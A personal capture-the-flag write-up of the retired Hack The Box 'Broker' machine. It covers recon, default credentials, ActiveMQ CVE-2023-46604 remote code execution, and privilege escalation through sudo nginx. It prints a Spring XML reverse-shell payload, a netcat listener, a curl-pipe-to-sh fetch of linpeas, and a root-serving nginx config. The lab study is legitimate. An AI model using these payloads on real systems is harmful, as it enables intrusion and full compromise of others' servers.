# Broker
First write-up doing HTB after a long time. I already solved this, so the notes will be from memory.


Metadata:
- OS: Linux
- Difficulty: Easy
- Status: Retired

## Recon

Started with running `nmap -sS <target-ip>` to get some information on the server. Learned that 22 & 80 were open. The fact it is using Nginx will be important later.

When you go to `http://<target-ip>`re prompted with a basic auth pop-up. Of course, `admin/admin` would work.

After logging in, you're directed to the splash page of ActiveMQ with the version: `5.15.15` (think I went to /admin to see the version). This is important because it is vulnerable to RCE [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

## Exploitation
Googling the CVE, I came across this efficient PoC from `X1r0z`. [Source Code](https://github.com/X1r0z/ActiveMQ-RCE).

```bash
git clone https://github.com/X1r0z/ActiveMQ-RCE.git
cd ActiveMQ-RCE #poc.xml example should exist
```

The PoC was simple enough, you modify an xml file that will be the payload sent and executed by the victim. Here is an example of that: [Thank you 0xdf](https://0xdf.gitlab.io/2023/11/09/htb-broker.html), because I actually needed assistance with privilege escalation. Something I hope to improve on in the future.

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/<your-ip>/1337 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```
Now it was time to connect to the victim machine. It involves 3 steps (I used 3 different terminal windows)

1. poc.xml needs to be hosted so the victim can `curl` and download the xml file.
2. start a netcat listener (port 1337 using my example)
3. run the PoC

```bash
# 1st terminal I run http server using python
python -m http.server #defaults to 8000

# 2nd terminal
ncat -lnvp 1337 # can't be leet if you don't use 1337

# 3rd terminal run the PoC
go run main.go -i <target-ip> -u http://<your-ip>:8000/poc.xml
```

### User Flag
At this point, you should get a shell connection on your 2nd terminal (where you ran netcat). From here, it is a simple `cd` and you'll have the user flag (user.txt).

### Privilege Escalation
This is where I sadly got stumped for a bit. I was able to get `linpeas.sh` on the box using curl and my http.server (port 8000).
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh #where my http server is being served

# from victim terminal
curl http://<your-ip>:8000/linpeas.sh | sh
```

Finally, we decided to look at what others did and came across a clean privilege escalation with Nginx. This is where the rest of the credit goes to `0xdf`. Hopefully with practice, I can improve on privilege escalation. Essentially, `sudo nginx` allows you to run a webserver as root. Thereby, allowing you to expose the root.txt flag.

First, you need to make a nginx.conf. Using `0xdf`'s example, I was able to write the file and `curl` it to the victim's machine (using the http.server).

Now, you want to save this file in a specific location that can run as root (I believe.). We stored it as `0xdf` did at `/dev/shm/nginx.conf`

```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 8008;
        root /;
        autoindex on;
    }
}
```
Next, you want to start the nginx server, `sudo /usr/sbin/nginx -c /dev/shm/nginx.conf`

### Root Flag
Lastly, run `curl http://<your-ip>:8008/root/root.txt` and paste the flag.

## Final Thoughts
This was my first box after not doing HTB for almost 2 years. It was definitely an easy problem due to the vulnerability it focused on (RCE's are really strong). Also, I know the box was retired when I attempted it - made for finding a walkthrough super easy. Overall, I think this was a pretty good challenge. Especially trying to remember how to do things.

I think total time, it took less than an hour to solve. Hopefully in time I can improve on my 'privilege escalation'-fu and use metasploit to save time.
